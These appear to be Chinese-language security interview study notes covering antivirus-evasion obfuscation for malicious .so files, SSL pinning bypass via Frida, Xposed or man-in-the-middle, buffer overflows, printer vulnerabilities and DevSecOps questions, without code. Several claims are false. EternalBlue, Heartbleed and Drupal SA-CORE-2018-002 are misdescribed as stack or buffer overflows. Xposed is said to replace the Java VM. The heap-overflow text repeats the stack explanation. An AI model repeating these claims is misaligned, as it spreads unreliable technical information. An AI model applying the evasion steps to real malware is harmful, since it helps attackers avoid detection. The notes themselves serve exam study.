### so混淆的基本方式？
> 1. 加密字符串：将恶意代码中的字符串进行加密处理，避免恶意字符串被静态扫描工具检测到。在运行时需要使用相应的解密方法进行解密。
> 2. 修改函数名：将原始的函数名修改为其他随机的名称，从而使杀毒软件难以将其与已知的恶意代码进行匹配。
> 3. 导出函数名称混淆：将恶意代码中导出的函数名称进行混淆处理，从而使恶意代码难以被外部调用。
> 4. 增加无用代码：在恶意代码中添加大量无用的代码，从而使杀毒软件难以对其进行分析和检测。
> 5. 动态链接库代理：使用动态链接库代理技术，将恶意代码转移到另一个进程中执行，从而使杀毒软件难以对其进行分析和检测。
> 6. 使用加密算法：将恶意代码进行加密，使用特定的算法进行解密，从而使杀毒软件难以检测到恶意代码。


### 怎么绕过SSLpining
> 1. 劫持函数: 修改应用程序代码，使其调用特定的系统函数，这些函数负责实现SSL Pinning检查。可以使用frida或Xposed框架实现此功能，通过hook相关函数的方式绕过SSL Pinning检查。
> 2. 修改应用程序: 如果有足够的权限，可以修改应用程序代码以删除SSL Pinning检查。这需要对应用程序进行反编译和重新打包，以使修改后的应用程序可以运行。
> 3. 中间人攻击: 尽管SSL Pinning可以保护应用程序免受中间人攻击，但仍然可以使用中间人攻击绕过SSL Pinning。攻击者可以使用SSL代理或ARP欺骗等技术来截获通信，然后使用自己的证书或公钥与应用程序进行通信，以绕过SSL Pinning检查。

### Xposed和frida的工作原理，Xposed和frida的区别等
> Xposed是通过替换系统的Java虚拟机来实现hook功能的，它使用了一种叫做"ART"的技术，将系统的Java虚拟机替换为自己的虚拟机，然后在自己的虚拟机中运行应用程序，从而实现了hook功能。
> Frida则是通过注入代码到运行时的应用程序中来实现hook功能的。Frida的核心是一个名为"frida-server"的服务端程序，它运行在Android设备上，并且通过socket和客户端程序（如Python脚本）进行通信。Frida在运行时动态地将JavaScript代码注入到目标应用程序中，从而实现了hook功能。
> Xposed和Frida的区别在于它们的工作原理不同，Xposed是替换系统的Java虚拟机实现hook，而Frida是通过注入代码到运行时的应用程序中实现hook。此外，Frida具有跨平台的能力，可以在多种操作系统上使用，而Xposed则只能在Android上使用。Frida还支持使用JavaScript语言进行hook，这使得使用Frida进行hook的过程变得更加简单和灵活。

### 说一下arm-vmp与dex-vmp的区别？

### 说一下当前dex-vmp的一些解决思路，以及新的vmp的混淆点，有了解么？

### 说一些ollvm的分类以及如何解决ollvm的初步思路

### 现在ollvm中你认为比较困难的点是哪些？

## 二进制
### 栈溢出、堆溢出：
栈溢出漏洞：栈是一个内存区域，用于存储程序中的局部变量、函数参数和返回地址等信息。当程序执行一个函数时，会将函数的局部变量和参数压入栈中。如果程序中的栈缓冲区（stack buffer）不够大，或者没有正确检查用户输入的数据长度，就可能导致缓冲区溢出，覆盖栈中存储的返回地址、函数指针等重要信息，从而导致程序崩溃或被攻击者利用。攻击者可以通过精心构造的输入，将恶意代码注入到程序中，并在覆盖返回地址后将控制流转移到恶意代码上，实现代码执行或提权等攻击。

堆溢出漏洞：堆是另一个内存区域，用于程序中动态分配内存。当程序中使用malloc()等函数分配堆内存时，系统会为该内存块分配一定大小的空间。如果程序中没有正确检查用户输入的数据长度，就可能导致缓冲区溢出，覆盖了其他重要数据，从而导致程序崩溃或被攻击者利用。攻击者可以通过精心构造的输入，将恶意代码注入到程序中，并在覆盖返回地址后将控制流转移到恶意代码上，实现代码执行或提权等攻击。

总的来说，栈溢出漏洞和堆溢出漏洞都是由于缓冲区溢出导致的安全漏洞，攻击者可以通过利用溢出现象，改变程序执行流，实现恶意攻击。要避免这些漏洞，程序开发人员应该编写安全的代码，包括正确地检查用户输入、限制缓冲区大小、使用编译器提供的安全选项、使用堆栈保护技术等。同时，安全测试人员可以使用渗透测试等技术来发现和利用这些漏洞，以帮助程序开发人员修复漏洞并提高程序的安全性。


在2017年，美国国家安全局的工具“永恒之蓝”（EternalBlue）曝出了一个栈溢出漏洞，该漏洞可以被利用来远程攻击运行Windows操作系统的计算机。该漏洞的漏洞编号为CVE-2017-0144。

该漏洞的原理是，攻击者可以向Windows操作系统中的SMBv1服务发送恶意数据包，触发服务中的缓冲区溢出漏洞，使得攻击者能够执行任意的恶意代码。攻击者可以利用该漏洞，将自己的恶意代码注入到操作系统的内存中，并在栈中寻找缓冲区溢出的机会，从而覆盖返回地址，并实现对计算机的远程控制。

攻击者可以通过互联网上公开的“永恒之蓝”工具进行攻击，该工具的源码在黑客论坛上公开。该漏洞被广泛利用，导致了大量的Windows系统被攻击，并引起了广泛的关注和媒体报道。

以上是一个关于栈溢出漏洞的实际案例。类似的漏洞还有很多，例如，2014年心脏出血漏洞（Heartbleed）利用了OpenSSL库中的缓冲区溢出漏洞，2018年Drupal CMS中的漏洞SA-CORE-2018-002也利用了缓冲区溢出漏洞，导致大量的网站被攻击。这些漏洞的共同点是都利用了程序中的缓冲区溢出漏洞，攻击者可以通过利用这些漏洞，实现对程序的控制和攻击。

### 常用的打印机漏洞和修复方式
> 1. 未授权访问：打印机默认账号密码没有修改，或者是被恶意攻击者利用漏洞绕过了认证机制，可以导致敏感信息泄露、恶意代码注入等安全问题。
> 2. 系统漏洞：打印机操作系统存在漏洞，可能被攻击者利用进行远程命令执行等攻击。
> 3. 僵尸网络：攻击者利用漏洞将打印机加入僵尸网络，进行DDoS攻击等活动。
> 4. 打印机驱动漏洞：攻击者通过修改打印机驱动文件或者利用打印机驱动程序中的漏洞，可以在受害者计算机上执行任意代码。
> 
修复打印机漏洞的方式包括：
> 1. 修改默认账号密码，严格控制访问权限。
> 2. 更新打印机的操作系统和驱动程序，修复已知漏洞。
> 3. 关闭不必要的服务，减少攻击面。
> 4. 定期检查打印机安全设置和日志，及时发现异常情况。

## SDL

SCA实现原理
pom.xml里的组件是全部的吗？不是的话怎么办 
IAST原理
动态插桩检测原理
CICD的流程
devsecops的流程
落地时候有没有遇到什么困难，如何解决？
如何评判devsecops做的好坏，最终我们聚焦到什么上，漏洞闭环等等 
工具链的选择理由
